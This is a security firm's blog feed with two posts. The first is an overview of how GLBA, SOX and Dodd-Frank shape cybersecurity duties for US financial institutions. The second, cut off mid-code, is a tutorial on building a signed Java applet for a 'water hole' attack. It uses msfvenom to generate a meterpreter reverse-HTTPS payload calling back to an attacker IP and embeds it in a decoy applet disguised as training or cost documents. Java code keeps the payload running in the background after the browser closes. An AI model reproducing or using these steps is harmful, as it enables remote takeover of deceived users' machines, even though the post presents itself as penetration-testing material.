<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2019-01-15T06:49:20-08:00</updated><id>http://localhost:4000/</id><title type="html">Black Lantern Security</title><subtitle>Attack To Defend
</subtitle><author><name>Black Lantern Security</name><email>info@blacklanternsecurity.com</email></author><entry><title type="html">What’s my exposure?</title><link href="http://localhost:4000/2017-01-01-cybersecurity-exposure/" rel="alternate" type="text/html" title="What’s my exposure?" /><published>2017-01-01T00:00:00-08:00</published><updated>2017-01-01T00:00:00-08:00</updated><id>http://localhost:4000/cybersecurity-exposure</id><content type="html" xml:base="http://localhost:4000/2017-01-01-cybersecurity-exposure/">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;

&lt;p&gt;Financial institutions and businesses have been making risk-based decisions in order to protect what’s most important since their inception. The addition of information-systems and applications only serves to extend many of the concepts they are already familiar with, including regulations, risk, assets, intellectual property, vulnerabilities, threats, and threat multipliers. It’s important to understand how cybersecurity requirements for these systems add to what is already a long list of statutory and regulatory requirements. However, what’s more important is not to lose sight of the fact that those information-systems and security controls exist to support the business, not the other way around. They should be increasing productivity, driving revenue, generating profits and reducing risk, not dragging them in the opposite direction. Financial institutions understand how to analyse risk in order to better protect their investments; cybersecurity should be no different. Regulatory requirements and compliance will start an organization down the right path. However, an honest and thorough approach to securing critical information-systems and the data they contain will simultaneously hit those “check boxes” and smartly align those resources with business objectives.&lt;/p&gt;

&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;

&lt;p&gt;Financial institutions in the U.S. have almost always been subject to a myriad of statutory and regulatory requirements&lt;/p&gt;

&lt;p&gt;[&lt;a href=&quot;/2017-01-01-cybersecurity-exposure/#reference-1&quot;&gt;1&lt;/a&gt;]. In some cases these regulations help protect the marketplace from instabilities introduced by unscrupulous lending practices[&lt;a href=&quot;/2017-01-01-cybersecurity-exposure/#reference-2&quot;&gt;2&lt;/a&gt;]. For others, they are an attempt to address accounting fraud through accurate and reliable reporting[&lt;a href=&quot;/2017-01-01-cybersecurity-exposure/#reference-3&quot;&gt;3&lt;/a&gt;]. Still others seek to protect the information provided by consumers when purchasing products and services[&lt;a href=&quot;/2017-01-01-cybersecurity-exposure/#reference-4&quot;&gt;4&lt;/a&gt;]. Regardless of the specific law or regulation, there are information-systems and applications that facilitate and support the business functions that simultaneously make money for the institution and satisfy regulatory requirements. This post will attempt to dissect and understand how statutory and regulatory requirements impact cybersecurity requirements for U.S financial institutions.
With regard to information-systems and cybersecurity requirements, the most significant pieces of legislation passed to date include:&lt;/p&gt;

&lt;p&gt;Gramm-Leach-Bliley Act (GLBA) of 1999 , Pub.L.106-102
Sarbanes-Oxley Act (SOX) of 2002, Pub.L.107-204
Dodd-Frank Wall Street Reform and Consumer Protection Act of 2010, Pub.L.111-203
Although there are other laws that directly and/or indirectly impact cybersecurity requirements, one could argue that any regulations that proceed from these laws are subsumed by the requirements for the 3 pieces of legislation above. For example, the disposal of consumer data specified in the “Fair and Accurate Credit Transactions Act”[&lt;a href=&quot;/2017-01-01-cybersecurity-exposure/#reference-5&quot;&gt;5&lt;/a&gt;] is already covered by regulatory guidance for GLBA[&lt;a href=&quot;/2017-01-01-cybersecurity-exposure/#reference-6&quot;&gt;6&lt;/a&gt;].&lt;/p&gt;

&lt;h1 id=&quot;gramm-leach-bliley-act-glba&quot;&gt;Gramm-Leach-Bliley Act (GLBA)&lt;/h1&gt;
&lt;h3 id=&quot;summary&quot;&gt;Summary&lt;/h3&gt;
&lt;p&gt;Out of the 3 pieces of legislation above, it could be argued that GLBA most directly impacts cybersecurity requirements for financial institutions through the privacy and safeguards rules. The privacy rule is intended to protect consumer financial privacy by placing limits on the release of non-public personal information (NPI) to unaffiliated third parties. NPI[&lt;a href=&quot;/2017-01-01-cybersecurity-exposure/#reference-7&quot;&gt;7&lt;/a&gt;] includes income, social security numbers, payment history, and loan and deposit balances. The safeguards rule[&lt;a href=&quot;/2017-01-01-cybersecurity-exposure/#reference-8&quot;&gt;8&lt;/a&gt;] requires the financial institution to implement a security program to protect this NPI. The centrepiece of this implementation is the risk analysis and overall risk management process. The high level objectives for the security program are to:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Inventory and classify information-systems hardware and software;&lt;/li&gt;
  &lt;li&gt;Assess vulnerabilities in information-systems and business processes;&lt;/li&gt;
  &lt;li&gt;Review threats to critical resources and NPI;&lt;/li&gt;
  &lt;li&gt;Quantify the risks to critical resources, NPI, and business processes;&lt;/li&gt;
  &lt;li&gt;Develop and implement a mitigation strategy, which includes implementation and updates for critical security controls;&lt;/li&gt;
  &lt;li&gt;Monitor and manage organizational risk; and&lt;/li&gt;
  &lt;li&gt;Modify security controls and update the security program as needed.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;impacted-financial-institutions&quot;&gt;Impacted Financial Institutions&lt;/h3&gt;

&lt;p&gt;Organizations that are “significantly engaged” in “financial activities” are subject to the regulatory requirements that proceed from the privacy and safeguards rules of GLBA. According to Bank Holding Company Act of 1956[&lt;a href=&quot;/2017-01-01-cybersecurity-exposure/#reference-9&quot;&gt;9&lt;/a&gt;], financial activities include, but are not limited to:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;lending, exchanging, transferring, investing for others, or safeguarding money or securities&lt;/li&gt;
  &lt;li&gt;brokering loans&lt;/li&gt;
  &lt;li&gt;servicing loans&lt;/li&gt;
  &lt;li&gt;debt collecting&lt;/li&gt;
  &lt;li&gt;real estate settlement services&lt;/li&gt;
  &lt;li&gt;insuring, guaranteeing, or indemnifying against loss, harm, damage, illness, disability, or death, or providing and issuing annuities, and acting as principal, agent, or broker for purposes of the foregoing, in any State&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;enforcement&quot;&gt;Enforcement&lt;/h3&gt;

&lt;p&gt;GLBA regulations are enforced by a number of organizations. The enforcement body depends on the nature of the financial institution being considered. Enforcement organizations currently include[&lt;a href=&quot;/2017-01-01-cybersecurity-exposure/#reference-10&quot;&gt;10&lt;/a&gt;]:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Consumer Financial Protection Bureau (CFPB)&lt;/li&gt;
  &lt;li&gt;Federal Trade Commission (FTC)&lt;/li&gt;
  &lt;li&gt;Securities and Exchange Commission (SEC)&lt;/li&gt;
  &lt;li&gt;Federal Financial Institutions Examination Council (FFIEC)&lt;/li&gt;
  &lt;li&gt;Federal Reserve Board (FRB)&lt;/li&gt;
  &lt;li&gt;Federal Deposit Insurance Corporation (FDIC)&lt;/li&gt;
  &lt;li&gt;National Credit Union Administration (NCUA)&lt;/li&gt;
  &lt;li&gt;Office of the Comptroller of the Currency (OCC)&lt;/li&gt;
  &lt;li&gt;Office of Thrift Supervision (OTS)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The FFIEC was established in 1979 and includes principals from the FRB, FDIC, NCUA, OCC, and CFPB. The FFIEC published an information security handbook which “addresses regulatory expectations regarding the security of all information-systems and information maintained by or on behalf of a financial institution, including a financial institution’s own information and that of all of its customers.”[&lt;a href=&quot;/2017-01-01-cybersecurity-exposure/#reference-11&quot;&gt;11&lt;/a&gt;] The FFIEC handbook and several additional resources for guiding organizations through GLBA regulatory requirements are included in section 4 below.&lt;/p&gt;

&lt;h3 id=&quot;resources&quot;&gt;Resources&lt;/h3&gt;

&lt;p&gt;The resources below provide prescriptive steps for addressing regulatory requirements. These resources are intended for organizations that are ready to ask, “what do I do now?”&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;FFIEC Information Security Handbook
http://ithandbook.ffiec.gov/media/resources/3354/con-15usc_6801_6805-gramm_leach_bliley_act.pdf&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;FFIEC Cybersecurity Assessment Tool
https://www.ffiec.gov/cyberassessmenttool.htm&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Critical Security Controls
https://www.cisecurity.org/&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Critical Security Controls Master Mapping
http://www.auditscripts.com/download/2742/&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;dodd-frank-wall-street-reform-and-consumer-protection-act&quot;&gt;Dodd-Frank Wall Street Reform and Consumer Protection Act&lt;/h1&gt;
&lt;h3 id=&quot;summary-1&quot;&gt;Summary&lt;/h3&gt;

&lt;p&gt;Although Dodd-Frank enacted far-reaching reforms, it only appears to indirectly impact the cybersecurity requirements for financial institutions. Title X of Dodd-Frank, known as the Consumer Financial Protection Act of 2010, established the Consumer Financial Protection Bureau (CFPB) and empowered it with the authority to issue regulations and take enforcement actions under Title V of GLBA[&lt;a href=&quot;/2017-01-01-cybersecurity-exposure/#reference-12&quot;&gt;12&lt;/a&gt;]. “Title V” refers to the GLBA privacy rule detailed in section 3 above. In short, it transfers a significant amount of enforcement authority to the CFPB with regard to enforcing the GLBA privacy rule to protect consumer financial privacy and NPI. The safeguards rule and the regulations that prescribe administrative, technical, and physical security controls to protect that NPI appear unchanged.&lt;/p&gt;

&lt;h3 id=&quot;impacted-financial-institutions13&quot;&gt;Impacted Financial Institutions[&lt;a href=&quot;/2017-01-01-cybersecurity-exposure/#reference-13&quot;&gt;13&lt;/a&gt;]&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;lending, exchanging, transferring, investing for others, or safeguarding money or securities&lt;/li&gt;
  &lt;li&gt;brokering loans&lt;/li&gt;
  &lt;li&gt;servicing loans&lt;/li&gt;
  &lt;li&gt;debt collecting&lt;/li&gt;
  &lt;li&gt;real estate settlement services&lt;/li&gt;
  &lt;li&gt;insuring, guaranteeing, or indemnifying against loss, harm, damage, illness, disability, or death, or providing and issuing annuities, and acting as principal, agent, or broker for purposes of the foregoing, in any State&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;enforcement-1&quot;&gt;Enforcement&lt;/h3&gt;

&lt;p&gt;The Security and Exchange Commission (SEC) is responsible for the enforcement of the provisions of Dodd-Frank.&lt;/p&gt;

&lt;h3 id=&quot;resources-1&quot;&gt;Resources&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Privacy Protection for Customer Financial Information
https://fas.org/sgp/crs/misc/RS20185.pdf&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;The Dodd-Frank Wall Street Reform and Consumer Protection Act: Title X, The Consumer Financial Protection Bureau
http://www.llsdc.org/assets/DoddFrankdocs/crs-r41338.pdf&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;sarbanes-oxley-act-sox&quot;&gt;Sarbanes-Oxley Act (SOX)&lt;/h1&gt;
&lt;h3 id=&quot;summary-2&quot;&gt;Summary&lt;/h3&gt;

&lt;p&gt;Sarbanes Oxley (SOX) was enacted as part of the US government’s response to the financial and accounting scandals tied to Worldcom, Enron, and Arthur Anderson Accounting in the early 2000s. One of the main provisions in SOX requires corporations to implement internal controls to ensure accurate and reliable corporate disclosures. Corporations must also annually assess the effectiveness of its internal controls and report findings to the SEC. Since many of the internal controls as well as the reporting mechanisms themselves are dependent on information-systems and applications, the impact on the organization’s cybersecurity requirements is significant. In this case the regulatory requirements that proceed from SOX dovetail almost perfectly with the goal of information security, which is to protect the confidentiality, integrity, and availability (CIA) of information-systems and the financial data they contain.&lt;/p&gt;

&lt;h3 id=&quot;impacted-financial-institutions14&quot;&gt;Impacted Financial Institutions[&lt;a href=&quot;/2017-01-01-cybersecurity-exposure/#reference-14&quot;&gt;14&lt;/a&gt;]&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Publically Traded Companies in the US&lt;/li&gt;
  &lt;li&gt;Publically Traded Non-US Companies doing business in the US&lt;/li&gt;
  &lt;li&gt;Private companies preparing for an Initial Public Offering (IPO)&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;enforcement-2&quot;&gt;Enforcement&lt;/h3&gt;

&lt;p&gt;SOX does not provide prescriptive actions for securing Information-systems and assessing specific security controls. As part of SOX, the Public Company Accounting Oversight Board (PCAOB) was formed to create, provide, and enforce audit guidelines for internal controls. Unfortunately, the PCAOB includes very little practical guidance for addressing IT security controls[&lt;a href=&quot;/2017-01-01-cybersecurity-exposure/#reference-15&quot;&gt;15&lt;/a&gt;]. The PCAOB subsequently selected a framework for creating and implementing internal controls created by the Committee of Sponsoring Organizations (COSO). However, COSO is also not specific enough for information security professionals15. There are several frameworks that provide specific prescriptive guidance for implementing and assessing security controls for information-systems and applications. These include COBIT[&lt;a href=&quot;/2017-01-01-cybersecurity-exposure/#reference-1&quot;&gt;16&lt;/a&gt;] and the CIS Critical Security Controls[&lt;a href=&quot;/2017-01-01-cybersecurity-exposure/#reference-17&quot;&gt;17&lt;/a&gt;].&lt;/p&gt;

&lt;h3 id=&quot;resources-2&quot;&gt;Resources&lt;/h3&gt;

&lt;p&gt;It’s important to note that the frameworks below are fundamentally no different than some of the resources listed in section 3.4 for GLBA compliance. In fact, the “Critical Security Controls Master Mapping” document below explicitly maps each of the critical security controls to an equivalent activity/domain in the FFEIC CAT. There are lots of resources available for organizations looking to start down the path of regulatory compliance. However, one could easily argue that they all boil down to the same set of basic security principles.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Critical Security Controls
https://www.cisecurity.org/&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Critical Security Controls Master Mapping
http://www.auditscripts.com/download/2742/&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;black-lantern-security-bls-services-and-subscriptions&quot;&gt;Black Lantern Security (BLS) Services and Subscriptions&lt;/h1&gt;

&lt;p&gt;BLS provides a suite of security services and subscriptions to help organizations develop, implement, and mature their information security program. BLS services and subscriptions have been designed according security best practices and are ideal for any organization looking to build a solid security program that supports GLBA and SOX compliance.  Our methodologies and approach have been developed over the last decade as the founding partners secured some of the Nations most sensitive systems. Services and subscriptions include:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Risk Analysis&lt;/li&gt;
  &lt;li&gt;Vulnerability Assessment&lt;/li&gt;
  &lt;li&gt;Penetration Testing&lt;/li&gt;
  &lt;li&gt;Wireless Assessment&lt;/li&gt;
  &lt;li&gt;Web Application Assessment&lt;/li&gt;
  &lt;li&gt;Secure Code Review&lt;/li&gt;
  &lt;li&gt;Centralized Logging and Alerting&lt;/li&gt;
  &lt;li&gt;Offensive Security Tools and Utilities&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;Regardless of where the regulations proceed from, engineering your information-systems and associated security controls will always come down to the same basic set of security principles. If things are implemented correctly then satisfying the regulatory requirements almost becomes an after thought. If you set out to secure what’s most important to the business and decisions are based on what’s critical to the near- and long-term success of the business, then compliance comes naturally. Compliance is not the challenge, the challenge lies in understanding where your crown jewels reside, the types of attacks your most likely to see, and how best to tune your people, process, and tools to defend and evolve.&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;

&lt;p&gt;[1]&lt;a id=&quot;reference-1&quot;&gt;&lt;/a&gt; Federal Reserve Act, https://en.wikipedia.org/wiki/Federal_Reserve_Act&lt;/p&gt;

&lt;p&gt;[2]&lt;a id=&quot;reference-2&quot;&gt;&lt;/a&gt; Dodd-Frank Wall Street Reform Act, https://www.gpo.gov/fdsys/pkg/PLAW-111publ203/html/PLAW-111publ203.htm&lt;/p&gt;

&lt;p&gt;[3]&lt;a id=&quot;reference-3&quot;&gt;&lt;/a&gt; Sarbanes-Oxley Act, https://www.gpo.gov/fdsys/pkg/PLAW-107publ204/html/PLAW-107publ204.htm&lt;/p&gt;

&lt;p&gt;[4]&lt;a id=&quot;reference-4&quot;&gt;&lt;/a&gt; Gramm-Leach-Bliley Act, https://www.gpo.gov/fdsys/pkg/PLAW-106publ102/html/PLAW-106publ102.htm&lt;/p&gt;

&lt;p&gt;[5]&lt;a id=&quot;reference-5&quot;&gt;&lt;/a&gt; Fair and Accurate Credit Transactions Act, https://www.gpo.gov/fdsys/pkg/PLAW-108publ159/html/PLAW-108publ159.htm&lt;/p&gt;

&lt;p&gt;[6]&lt;a id=&quot;reference-6&quot;&gt;&lt;/a&gt; FFEIC CyberSecurity Assessment Tool (CAT), https://www.ffiec.gov/cyberassessmenttool.htm&lt;/p&gt;

&lt;p&gt;[7]&lt;a id=&quot;reference-7&quot;&gt;&lt;/a&gt; https://www.ftc.gov/tips-advice/business-center/guidance/how-comply-privacy-consumer-financial-information-rule-gramm&lt;/p&gt;

&lt;p&gt;[8]&lt;a id=&quot;reference-8&quot;&gt;&lt;/a&gt; https://www.ftc.gov/tips-advice/business-center/guidance/financial-institutions-customer-information-complying&lt;/p&gt;

&lt;p&gt;[9]&lt;a id=&quot;reference-9&quot;&gt;&lt;/a&gt; https://fraser.stlouisfed.org/scribd/?title_id=984&amp;amp;filepath=/files/docs/historical/congressional/1956_bankholdact_publiclaw511.pdf&lt;/p&gt;

&lt;p&gt;[10]&lt;a id=&quot;reference-10&quot;&gt;&lt;/a&gt; http://ithandbook.ffiec.gov/media/resources/3354/con-15usc_6801_6805-gramm_leach_bliley_act.pdf&lt;/p&gt;

&lt;p&gt;[11]&lt;a id=&quot;reference-11&quot;&gt;&lt;/a&gt; http://ithandbook.ffiec.gov/it-booklets/information-security/introduction.aspx&lt;/p&gt;

&lt;p&gt;[12]&lt;a id=&quot;reference-12&quot;&gt;&lt;/a&gt; https://fas.org/sgp/crs/misc/RS20185.pdf&lt;/p&gt;

&lt;p&gt;[13]&lt;a id=&quot;reference-13&quot;&gt;&lt;/a&gt; https://fraser.stlouisfed.org/scribd/?title_id=984&amp;amp;filepath=/files/docs/historical/congressional/1956_bankholdact_publiclaw511.pdf&lt;/p&gt;

&lt;p&gt;[14]&lt;a id=&quot;reference-14&quot;&gt;&lt;/a&gt; http://www.sarbanes-oxley-101.com/sarbanes-oxley-faq.htm&lt;/p&gt;

&lt;p&gt;[15]&lt;a id=&quot;reference-15&quot;&gt;&lt;/a&gt; https://www.sans.org/reading-room/whitepapers/legal/overview-sarbanes-oxley-information-security-professional-1426&lt;/p&gt;

&lt;p&gt;[16]&lt;a id=&quot;reference-16&quot;&gt;&lt;/a&gt; http://www.isaca.org/cobit/pages/default.aspx&lt;/p&gt;

&lt;p&gt;[17]&lt;a id=&quot;reference-17&quot;&gt;&lt;/a&gt; https://www.cisecurity.org/critical-controls.cfm&lt;/p&gt;</content><author><name>Dr. Philip Hartlieb</name><email>philip@blacklanternsecurity.com</email></author><summary type="html">What’s my exposure?</summary></entry><entry><title type="html">Signed Java Applet - Water Hole Attack</title><link href="http://localhost:4000/2016-05-01-signed-java-applet/" rel="alternate" type="text/html" title="Signed Java Applet - Water Hole Attack" /><published>2016-05-01T00:00:00-07:00</published><updated>2016-05-01T00:00:00-07:00</updated><id>http://localhost:4000/signed-java-applet</id><content type="html" xml:base="http://localhost:4000/2016-05-01-signed-java-applet/">&lt;p&gt;&lt;img src=&quot;/assets/img/signed-java-applet/java_warning.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;One of the common attack vectors deals with water hole attacks. These attacks are used to tempt users to click on documents, links, and content that will allow execution onto their box. These can take many forms: Microsoft Office macros (Excel, Word), Flash enabled sites, Javascript attacks, and specifically Java signed applets. We’re going to walk you through creating your own java signing certificate (If you don’t have one) and then how to code sign your java applet within NetBeans.&lt;/p&gt;

&lt;h3 id=&quot;create-your-code-signing-certificate&quot;&gt;Create your code signing certificate:&lt;/h3&gt;

&lt;p&gt;First let’s create your java certificate file.
Make sure you have openssl installed. If you’re on ubuntu:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt-get install openssl
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Change directory to the openssl:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd /usr/lib/ssl/misc/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Execute the CA.sh bash script to create your initital CA authority&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CA.sh -newca
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Change directory to the new folder, demoCA&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd demoCA
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Copy the openssl.cnf from the /usr/lib/ssl/ directory and modify usage for the code signing:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cp /usr/lib/ssl/openssl.conf .
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Open openssl.conf and modify the following fields to contain the following values
&lt;strong&gt;Note that a code signing certificate can only be used for code signing&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;keyUsage = digitalSignature
extendedKeyUsage = codeSigning&lt;/p&gt;

&lt;p&gt;Then modify the dir to operate from in the configuration file to the local directory (still within the openssl.conf)[ CA_default ] From
dir = ./demoCA
To
dir = ./&lt;/p&gt;

&lt;p&gt;Create the user request based on the configuration you modified&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl req -new -keyout user.key -out user.req -config
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Sign the certificate by the CA&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl ca -policy policy_anything -config -out user.pem -infiles user.req
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Export the certificate in pk12 format.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl pkcs12 -export -in user.pem -inkey user.key -out user.p12 -name -caname -chain -CAfile ./cacert.pem
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Convert the CA certificate into pk12 format:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl pkcs12 -export -out root_cert.pfx -inkey ./private/cakey.pem -in cacert.pem -certfile cacert.pem
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Convert the user code signing certificate into java jks storage
&lt;strong&gt;Note, make sure you remember the alias used when creating the user certificate. You can view it by executing the following:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;keytool -v -list -storetype pkcs12 -keystore user.p12
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Convert the certificate to jks:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;keytool -importkeystore -srckeystore user.p12 -srcstoretype pkcs12 -srcalias -destkeystore user.jks -deststoretype jks -deststorepass password -destalias
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Copy the user.p12 and root_cert.pfx to the systems that will be utilizing the Java applet. Copy the user.jks to the system that will be signing the applet.&lt;/p&gt;

&lt;p&gt;Generate the meterpreter jar file
Use your latest Kali VM, use msfvenom in order to create your jar file that you will use to decompile and insert into your java program.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p java/meterpreter/reverse_https -f raw LHOST=192.168.1.5 LPORT=443 &amp;gt; java_rhttps.jar
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Download jd-gui from http://jd.benow.ca/ to decompile the jar.&lt;/p&gt;

&lt;p&gt;Export all the sources to a zip file and we will import them into our java project.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/signed-java-applet/jd-gui.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;creating-the-signed-java-applet&quot;&gt;Creating the signed java applet&lt;/h3&gt;

&lt;p&gt;Make sure you have the latest Netbeans installed. Create a new project in netbeans. The narrative here is to create a java applet that doesn’t call too much attention to itself, but the victims will still have a reason to click on it. A training requirement, an updated cost schedule, or something that would require them to launch a browser and view the information.&lt;/p&gt;

&lt;p&gt;With Netbeans, you can create java fxml projects with are a bit snazzier when it comes to their display. You can spend alot of time creating your java applet, but for the purposes of this post we’ll stick with something simple.&lt;/p&gt;

&lt;p&gt;After you’ve got your shell java program, we need to add some code to launch our new thread which will kick off our java meterpreter. This will also be useful so that if the browser or java applet gets closed, our java meterperter will stay running in the background.&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Thread&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;athread&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Runnable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
   &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
   &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
       &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;Payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]);&lt;/span&gt;
       &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
       &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;){}&lt;/span&gt;
   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;});&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;athread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You also need to run your codebase from the context of an applet. Add another class file to run your applet from:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newProject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
 
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.applet.Applet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
 
